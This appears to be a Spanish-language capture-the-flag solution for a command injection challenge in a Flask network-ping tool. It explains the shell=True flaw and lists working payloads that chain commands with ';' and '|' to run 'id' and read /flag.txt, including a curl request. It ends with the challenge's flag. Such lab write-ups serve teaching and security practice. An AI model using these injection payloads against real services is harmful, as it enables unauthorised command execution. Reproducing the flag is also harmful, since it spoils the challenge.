# Solución Reto 6: Command Injection (ctf-cmdi)

## Descripción
El reto consiste en una herramienta web de diagnóstico de red que ejecuta `ping -c 2 <host>` en el servidor. El backend está construido en Flask y la vulnerabilidad radica en que el input del usuario se concatena directamente en el comando del sistema operativo usando `subprocess.run(shell=True)`, sin ningún tipo de sanitización o validación.

## Pasos para la Explotación

### 1. Identificar el Vector de Inyección
Al acceder al reto, se presenta un formulario con un campo "Host / IP destino". Al enviarlo, la app ejecuta internamente:

```bash
ping -c 2 <valor_del_campo>
```

Para confirmar que el campo es vulnerable, se introduce un payload de prueba usando el punto y coma (`;`), que en bash separa comandos secuenciales:

```
127.0.0.1; id
```

Si la respuesta muestra `uid=1000(ctf) gid=1000(ctf)`, la inyección funciona y tenemos ejecución de comandos en el servidor.

### 2. Extracción de la Flag

Sabiendo que la flag está en `/flag.txt`, se usa el mismo operador `;` para encadenar el comando `cat /flag.txt` después del ping:

**Payload:**
```
127.0.0.1; cat /flag.txt
```

Al enviar este payload en el campo "Host", el servidor ejecuta primero el ping y a continuación `cat /flag.txt`, cuya salida se muestra en pantalla junto con el resultado del ping.

### 3. Métodos Alternativos

También es posible usar otros metacaracteres del shell:

```bash
# Pipe (redirige stdout del primer comando como stdin del segundo)
127.0.0.1 | cat /flag.txt

# Solo el segundo comando (el ping falla, pero el shell continúa)
; cat /flag.txt

# Vía curl directamente
curl -X POST http://<HOST>:<PORT>/ping -d "host=127.0.0.1;cat /flag.txt"
```

## Flag
```
CTF{c0mmand_1nj3ct10n_15_d4ng3r0us}
```
